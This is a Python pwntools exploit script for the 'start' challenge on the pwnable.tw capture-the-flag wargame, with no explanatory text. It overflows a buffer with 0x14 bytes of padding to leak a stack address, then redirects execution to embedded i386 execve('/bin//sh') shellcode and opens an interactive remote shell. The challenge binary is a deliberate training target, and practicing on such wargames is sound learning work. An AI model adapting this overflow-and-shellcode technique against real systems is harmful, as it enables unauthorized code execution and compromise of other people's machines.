from pwn import *
context.log_level = 'debug'
context.arch = 'i386'
context.os = 'linux'
#io = gdb.debug('./start')
io = remote('chall.pwnable.tw',10000)
padding = b'A'*0x14
buf_addr = 0x8048087
shellcode=b"\x31\xc0\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xb0\x0b\xcd\x80"

def leak():
    global buf_addr
    payload = padding+p32(buf_addr)

    io.sendafter( b"Let's start the CTF:",payload)
    buf_addr = u32(io.recv(4))
    print('buf_addr->',hex(buf_addr))
    return 0

def pwn():
    global shellcode
    payload = padding+p32(buf_addr+0x14)+shellcode
    io.send(payload)
    return 0

leak()
pwn()
io.interactive()
